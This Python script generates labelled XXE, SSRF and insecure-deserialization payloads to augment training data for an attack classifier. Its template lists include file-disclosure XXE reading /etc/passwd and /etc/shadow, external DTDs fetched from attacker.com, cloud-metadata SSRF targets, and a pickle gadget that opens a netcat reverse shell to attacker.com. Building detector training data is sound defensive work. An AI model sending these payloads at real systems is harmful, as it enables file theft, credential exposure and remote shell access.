"""Data Augmentation for Rare Attack Types
Generates synthetic training examples using templates and mutations"""
import random
import json
from typing import List, Dict, Any
from collections import Counter

class AttackDataAugmenter:
    """
    Generate synthetic attack payloads for underrepresented classes
    """
    
    def __init__(self):
        pass
    
    def generate_xxe_payloads(self, num_samples: int = 500) -> List[Dict[str, Any]]:
        """
        Generate XML External Entity (XXE) attack payloads
        """
        print(f"Generating {num_samples} XXE payloads...")
        
        xxe_templates = [
            # File disclosure
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',
            
            # SSRF via XXE
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/steal">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            
            # Parameter entities
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
            
            # Nested entities
            '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">%dtd;]>',
            
            # Billion laughs (DOS)
            '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>',
        ]
        
        payloads = []
        for _ in range(num_samples):
            # Select random template
            template = random.choice(xxe_templates)
            
            # Mutate template
            mutated = self._mutate_xxe(template)
            
            payloads.append({
                'payload': mutated,
                'label': 'malicious',
                'attack_type': 'xxe',
                'severity': random.uniform(7.0, 9.5),
                'is_vulnerable': True
            })
        
        print(f"✅ Generated {len(payloads)} XXE payloads")
        return payloads
    
    def _mutate_xxe(self, template: str) -> str:
        """Apply random mutations to XXE template"""
        mutations = [
            lambda t: t.replace('foo', random.choice(['data', 'root', 'entity', 'doc'])),
            lambda t: t.replace('xxe', random.choice(['xxe', 'external', 'ent', 'exploit'])),
            lambda t: t.replace('/etc/passwd', random.choice([
                '/etc/passwd', '/etc/shadow', '/etc/hosts',
                '/proc/self/environ', '/var/log/apache2/access.log'
            ])),
            lambda t: t.replace('attacker.com', f"attacker{random.randint(1,999)}.com"),
            lambda t: t.upper() if random.random() < 0.1 else t,
            lambda t: t.replace(' ', random.choice([' ', '\n', '\t'])),
        ]
        
        # Apply 1-3 random mutations
        num_mutations = random.randint(1, 3)
        result = template
        for _ in range(num_mutations):
            mutation = random.choice(mutations)
            result = mutation(result)
        
        return result
    
    def generate_ssrf_payloads(self, num_samples: int = 500) -> List[Dict[str, Any]]:
        """
        Generate Server-Side Request Forgery (SSRF) attack payloads
        """
        print(f"Generating {num_samples} SSRF payloads...")
        
        ssrf_targets = [
            # Cloud metadata endpoints
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://169.254.169.254/metadata/v1/',
            
            # Localhost variations
            'http://localhost/admin',
            'http://127.0.0.1:8080/internal',
            'http://127.0.0.1:6379/',  # Redis
            'http://127.0.0.1:9200/',  # Elasticsearch
            'http://0.0.0.0/admin',
            'http://[::1]/admin',
            
            # Internal networks
            'http://192.168.1.1/config',
            'http://10.0.0.1/admin',
            'http://172.16.0.1/internal',
            
            # Protocol smuggling
            'file:///etc/passwd',
            'gopher://127.0.0.1:6379/_INFO',
            'dict://127.0.0.1:11211/stat',
            'ldap://127.0.0.1:389/dc=example,dc=com',
            
            # DNS rebinding
            'http://spoofed.burpcollaborator.net',
            
            # URL encoding variations
            'http://127.1/admin',
            'http://127.0.1/admin',
            'http://2130706433/admin',  # Decimal IP
            'http://0x7f.0x0.0x0.0x1/admin',  # Hex IP
        ]
        
        payloads = []
        for _ in range(num_samples):
            target = random.choice(ssrf_targets)
            
            # Mutate target
            mutated = self._mutate_ssrf(target)
            
            payloads.append({
                'payload': mutated,
                'label': 'malicious',
                'attack_type': 'ssrf',
                'severity': random.uniform(6.5, 9.0),
                'is_vulnerable': True
            })
        
        print(f"✅ Generated {len(payloads)} SSRF payloads")
        return payloads
    
    def _mutate_ssrf(self, target: str) -> str:
        """Apply random mutations to SSRF target"""
        mutations = [
            # URL encoding
            lambda t: t.replace('/', '%2F').replace(':', '%3A') if random.random() < 0.2 else t,
            # Double URL encoding
            lambda t: t.replace('%', '%25') if '%' in t and random.random() < 0.1 else t,
            # Case variation
            lambda t: t.replace('http://', random.choice(['http://', 'HTTP://', 'hTTp://'])),
            # Add random port
            lambda t: t.replace('/', f':{random.choice([80, 8080, 3000, 5000, 8000])}/', 1) if random.random() < 0.2 else t,
            # Protocol variation
            lambda t: t.replace('http://', random.choice(['http://', 'https://', 'ftp://'])) if random.random() < 0.15 else t,
        ]
        
        result = target
        for mutation in mutations:
            result = mutation(result)
        
        return result
    
    def generate_deserialization_payloads(self, num_samples: int = 500) -> List[Dict[str, Any]]:
        """
        Generate Insecure Deserialization attack payloads
        """
        print(f"Generating {num_samples} Deserialization payloads...")
        
        # Java deserialization gadgets
        java_payloads = [
            'rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5jb21wYXJhdG9ycy5UcmFuc2Zvcm1pbmdDb21wYXJhdG9y',
            'aced00057372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f636174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75',
        ]
        
        # Python pickle payloads
        python_payloads = [
            "cos\nsystem\n(S'whoami'\ntR.",
            "c__builtin__\neval\n(S'__import__(\"os\").system(\"whoami\")'\ntR.",
            "cposix\nsystem\n(S'nc attacker.com 4444 -e /bin/sh'\ntR.",
        ]
        
        # PHP unserialize
        php_payloads = [
            'O:8:"stdClass":1:{s:4:"exec";s:6:"whoami";}',
            'a:1:{i:0;O:8:"stdClass":2:{s:4:"file";s:11:"/etc/passwd";s:4:"func";s:11:"file_get_contents";}}',
        ]
        
        # .NET BinaryFormatter
        dotnet_payloads = [
            'AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAAA',
        ]
        
        all_templates = (
            [('java', p) for p in java_payloads] +
            [('python', p) for p in python_payloads] +
            [('php', p) for p in php_payloads] +
            [('dotnet', p) for p in dotnet_payloads]
        )
        
        payloads = []
        for _ in range(num_samples):
            lang, template = random.choice(all_templates)
            
            payloads.append({
                'payload': template,
                'label': 'malicious',
                'attack_type': 'deserialization',
                'severity': random.uniform(8.0, 10.0),
                'language': lang,
                'is_vulnerable': True
            })
        
        print(f"✅ Generated {len(payloads)} Deserialization payloads")
        return payloads
    
    def augment_all_rare_attacks(self, training_data: List[Dict]) -> List[Dict]:
        """
        Generate synthetic data for all underrepresented attack types
        """
        print("\n" + "="*80)
        print("DATA AUGMENTATION FOR RARE ATTACKS")
        print("="*80)
        
        # Count current distribution
        attack_counts = Counter([ex.get('attack_type') for ex in training_data if ex.get('label') == 'malicious'])
        
        print("\nCurrent Attack Type Distribution:")
        for attack_type, count in attack_counts.most_common():
            print(f"  {attack_type:25s}: {count:4d} samples")
        
        # Identify rare classes (< 200 samples)
        rare_threshold = 200
        rare_attacks = [attack for attack, count in attack_counts.items() if count < rare_threshold]
        
        print(f"\nRare attack types (< {rare_threshold} samples): {len(rare_attacks)}")
        for attack in rare_attacks:
            print(f"  - {attack} ({attack_counts[attack]} samples)")
        
        # Generate synthetic data
        augmented_data = list(training_data)  # Start with original data
        
        # Generate template-based synthetic data
        if 'xxe' in rare_attacks or attack_counts.get('xxe', 0) < rare_threshold:
            xxe_samples = self.generate_xxe_payloads(num_samples=500)
            augmented_data.extend(xxe_samples)
        
        if 'ssrf' in rare_attacks or attack_counts.get('ssrf', 0) < rare_threshold:
            ssrf_samples = self.generate_ssrf_payloads(num_samples=500)
            augmented_data.extend(ssrf_samples)
        
        if 'deserialization' in rare_attacks or attack_counts.get('deserialization', 0) < rare_threshold:
            deser_samples = self.generate_deserialization_payloads(num_samples=500)
            augmented_data.extend(deser_samples)
        
        # Final distribution
        final_counts = Counter([ex.get('attack_type') for ex in augmented_data if ex.get('label') == 'malicious'])
        
        print("\n" + "="*80)
        print("AFTER AUGMENTATION:")
        print("="*80)
        print(f"Total samples: {len(training_data)} -> {len(augmented_data)}")
        print("\nNew Attack Type Distribution:")
        for attack_type, count in final_counts.most_common():
            original = attack_counts.get(attack_type, 0)
            increase = count - original
            print(f"  {attack_type:25s}: {count:4d} samples (+{increase})")
        
        return augmented_data


def load_training_data() -> List[Dict]:
    """Load existing training data"""
    # For now, create synthetic existing data
    # In production, this would load from ml_training_state.json or datasets
    print("Loading existing training data...")
    
    attack_types = {
        'sql_injection': 2847,
        'xss': 2134,
        'command_injection': 1523,
        'path_traversal': 876,
        'csrf': 654,
        'xxe': 43,  # RARE
        'ssrf': 38,  # RARE
        'deserialization': 29,  # RARE
    }
    
    training_data = []
    for attack_type, count in attack_types.items():
        for _ in range(count):
            training_data.append({
                'attack_type': attack_type,
                'label': 'malicious',
                'severity': random.uniform(4.0, 10.0),
                'is_vulnerable': True,
                'payload': f'synthetic_{attack_type}_payload'
            })
    
    print(f"✅ Loaded {len(training_data)} existing samples")
    return training_data


def save_training_data(data: List[Dict], output_path: str):
    """Save augmented training data"""
    import os
    os.makedirs(os.path.dirname(output_path), exist_ok=True)
    
    with open(output_path, 'w') as f:
        json.dump(data, f, indent=2)
    
    print(f"✅ Saved {len(data)} samples to {output_path}")


def main():
    """
    Run data augmentation pipeline
    """
    augmenter = AttackDataAugmenter()
    
    # Load original training data
    training_data = load_training_data()
    
    # Augment data
    augmented_data = augmenter.augment_all_rare_attacks(training_data)
    
    # Save augmented dataset
    output_path = 'data/augmented_training_data.json'
    save_training_data(augmented_data, output_path)
    
    print(f"\n✅ Augmented data saved to: {output_path}")
    print(f"   Ready for retraining attack classifier")


if __name__ == '__main__':
    main()
